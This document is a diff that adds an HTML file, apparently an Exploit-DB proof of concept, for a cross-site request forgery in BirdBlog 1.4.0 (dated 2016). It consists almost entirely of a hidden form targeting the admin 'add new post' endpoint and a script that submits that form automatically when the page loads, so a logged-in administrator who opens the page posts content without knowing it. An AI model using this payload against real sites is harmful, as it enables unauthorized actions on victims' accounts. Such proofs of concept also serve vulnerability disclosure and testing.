@@ -1,0 +1,38 @@
+<!--
+# Exploit Title :              *BirdBlog 1.4.0* *- *Cross-Site Request Forgery  (*Add New Post*)
+# Author :                      *Besim*
+# Google Dork :                 -
+# Date :                         11/10/2016
+# Type :                         *webapps*
+# Platform :                    *PHP*
+# Software link: http://www.hotscripts.com/listings/jump/download/49011
+
+*########################### CSRF PoC ###############################*
+-->
+
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <form action="http://site_name/path/admin/entries.php?a=post" method="POST">
+      <input type="hidden" name="title" value="Exploit&#45;DB" />
+      <input type="hidden" name="category" value="1" />
+      <input type="hidden" name="music" value="rockrock" />
+      <input type="hidden" name="mood" value="rock" />
+      <input type="hidden" name="moodicon" value="1" />
+      <input type="hidden" name="entry" value="tester" />
+      <input type="hidden" name="excerpt" value="tester" />
+      <input type="hidden" name="password" value="" />
+      <input type="hidden" name="parseurls" value="1" />
+      <input type="hidden" name="parseemoticons" value="1" />
+      <input type="hidden" name="parsebbcode" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+<!--
+*####################################################################*
+-->
